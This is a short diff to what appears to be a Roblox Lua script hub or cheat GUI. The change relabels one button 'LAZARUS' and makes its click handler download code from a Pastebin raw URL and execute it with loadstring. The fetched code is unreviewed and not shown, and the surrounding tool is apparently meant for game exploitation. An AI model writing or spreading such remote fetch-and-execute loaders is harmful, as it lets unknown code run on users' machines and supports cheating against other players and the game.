@@ -2466,11 +2466,11 @@ TextButton_69.BorderColor3 = Color3.fromRGB(20, 20, 20)
 TextButton_69.Position = UDim2.new(0.186224416, 0, 0.0485074632, 0)
 TextButton_69.Size = UDim2.new(0, 97, 0, 62)
 TextButton_69.Font = Enum.Font.GothamBlack
-TextButton_69.Text = "e"
+TextButton_69.Text = "LAZARUS"
 TextButton_69.TextColor3 = Color3.fromRGB(0, 8, 179)
 TextButton_69.TextSize = 15.000
 TextButton_69.MouseButton1Down:connect(function()
-	
+loadstring(game:HttpGet("https://pastebin.com/raw/9KbGSnGn", true))()
 end)
 
 TextButton_70.Parent = R6onlypage
